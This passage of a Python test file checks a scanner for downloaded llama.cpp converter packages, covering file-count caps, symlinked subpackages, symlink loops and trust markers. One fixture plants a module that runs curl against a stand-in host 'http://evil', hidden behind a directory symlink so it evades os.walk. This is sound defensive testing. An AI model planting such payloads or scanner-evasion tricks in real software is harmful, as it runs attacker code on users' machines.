    an attacker must not choose how much work this does -- so crossing it is
    itself the finding.
    """
    llama_cpp = _load("llama_cpp_cap_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1):
        (conversion / f"mod_{index:03d}.py").write_text("VALUE = 1\n")

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert any("more than the" in record.message for record in caplog.records), (
        f"the oversized package was not reported: {[r.message for r in caplog.records]}"
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError, match = "more than the"):
        llama_cpp._scan_conversion_package(str(root))

    # The same switch that silences every other finding silences this one.
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    llama_cpp._scan_conversion_package(str(root))


def test_a_payload_behind_a_symlinked_subpackage_is_scanned(tmp_path, monkeypatch):
    """os.walk does not follow directory symlinks; the import machinery does.

    So `conversion/linked -> elsewhere`, imported as `conversion.linked` from an
    otherwise clean `__init__.py`, was never walked: the package read as fully
    scanned and strict mode ran the payload with nothing reported.
    """
    llama_cpp = _load("llama_cpp_symlink_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text(
        "from .linked import payload\n", encoding = "utf-8",
    )
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "__init__.py").write_text(
        "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
        encoding = "utf-8",
    )
    try:
        (conversion / "linked").symlink_to(outside, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")

    assert "linked/__init__.py" in llama_cpp._conversion_package_modules(str(conversion))

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_symlink_loop_in_the_package_terminates(tmp_path):
    """Following directory symlinks is what lets a loop be walked forever.

    `conversion/loop -> conversion` is a cycle os.walk will happily descend until
    it runs out of path, so the walk has to notice a directory it already saw.
    """
    llama_cpp = _load("llama_cpp_symlink_loop_probe", "unsloth_zoo/llama_cpp.py")

    conversion = tmp_path / "llama.cpp" / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    try:
        (conversion / "loop").symlink_to(conversion, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")

    names = llama_cpp._conversion_package_modules(str(conversion))

    # Terminating at all is the claim; the module is found once through the real
    # path, and the loop contributes at most the one pass before it is noticed.
    assert "__init__.py" in names
    assert len(names) <= 2


def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatch):
    """The cap bounded what got READ, not what got WALKED.

    conversion/ is attacker-supplied, so materializing the whole tree to discover
    it was too big hands over the unbounded time and memory the cap exists to
    deny -- and _conversion_sibling_info re-walks it before every cached export.
    """
    llama_cpp = _load("llama_cpp_walk_bound_probe", "unsloth_zoo/llama_cpp.py")

    conversion = tmp_path / "llama.cpp" / "conversion"
    conversion.mkdir(parents = True)
    # One file per directory, so each directory the walk yields is one more name:
    # stopping early has to mean visiting fewer directories, not just returning
    # fewer names from a tree it read in full.
    total = llama_cpp.MAX_CONVERSION_PACKAGE_FILES * 4
    for index in range(total):
        package = conversion / f"pkg_{index:04d}"
        package.mkdir()
        (package / "__init__.py").write_text("VALUE = 1\n", encoding = "utf-8")

    visited = []
    real_walk = os.walk

    def counting_walk(top, *args, **kwargs):
        for entry in real_walk(top, *args, **kwargs):
            visited.append(entry[0])
            yield entry

    monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
    limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1
    names = llama_cpp._conversion_package_modules(str(conversion), limit = limit)

    assert len(names) == limit
    assert len(visited) <= limit + 1, (
        f"walked {len(visited)} directories of {total} to learn the cap was crossed"
    )

    # Unbounded by default, so a caller that has not asked for a bound still gets
    # the whole tree rather than a silently truncated one.
    visited.clear()
    assert len(llama_cpp._conversion_package_modules(str(conversion))) == total


def test_a_package_within_the_cap_says_nothing_about_size(tmp_path, monkeypatch, caplog):
    """The other half: the report must not fire on an ordinary package."""
    llama_cpp = _load("llama_cpp_cap_ok_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_FILES):
        (conversion / f"mod_{index:03d}.py").write_text("VALUE = 1\n")

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert not [r for r in caplog.records if "more than the" in r.message]


def test_a_prebuilt_marker_does_not_buy_the_exemption(tmp_path, monkeypatch):
    """UNSLOTH_PREBUILT_INFO.json reads like proof of verification and is not.

    _stage_prebuilt_install checks a sha256 for the BINARY asset, and only when
    the release published one. The converter itself arrives separately through
    _hydrate_converter_sources, which downloads a source tarball with no digest
    at all, and the marker is written after that. So a replaced source tarball
    wore a "verified" marker, took the strict-mode exemption and skipped the
    conversion/ scan with it. The converter from a prebuilt bundle is a download
    like any other and is scanned like one.
    """
    llama_cpp = _load("llama_cpp_marker_probe", "unsloth_zoo/llama_cpp.py")

    bundle = tmp_path / "prebuilt"
    bundle.mkdir()
    script = bundle / "convert_hf_to_gguf.py"
    script.write_text("# converter\n")
    (bundle / llama_cpp.UNSLOTH_PREBUILT_INFO_FILENAME).write_text("{}")

    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)
    assert llama_cpp._converter_is_trusted_local(str(script)) is False, (
        "the marker does not say these converter bytes were verified"
    )


def test_a_pin_written_with_a_tilde_is_still_a_pin(tmp_path, monkeypatch):
    """_resolve_local_convert_script accepts the pin after expanduser, so this
    check has to expand it too, or a deliberately pinned converter with a finding
    is refused under strict mode as though it had been downloaded."""
    llama_cpp = _load("llama_cpp_tilde_probe", "unsloth_zoo/llama_cpp.py")

    home = tmp_path / "home"
    pinned = home / "llama.cpp"
    pinned.mkdir(parents = True)
    script = pinned / "convert_hf_to_gguf.py"
    script.write_text("# converter\n")

    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", "~/llama.cpp")
    assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
        "an unexpanded pin compared unequal to the expanded script path"
    )
